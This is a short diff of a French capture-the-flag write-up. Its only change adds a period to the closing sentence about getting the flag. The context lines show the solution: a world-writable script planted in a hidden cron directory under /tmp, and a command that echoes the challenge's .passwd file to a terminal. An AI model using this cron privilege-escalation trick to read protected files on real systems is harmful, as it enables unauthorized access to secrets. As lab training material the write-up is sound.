@@ -66,5 +66,5 @@ nano /tmp/._cron.d/shell.sh && chmod 777 /tmp/._cron.d/shell.sh
 echo $(</challenge/app-script/ch4/.passwd) > /dev/pts/13
 ```
 
-Au bout d'une minute j'obtient le flag
+Au bout d'une minute j'obtient le flag.
 
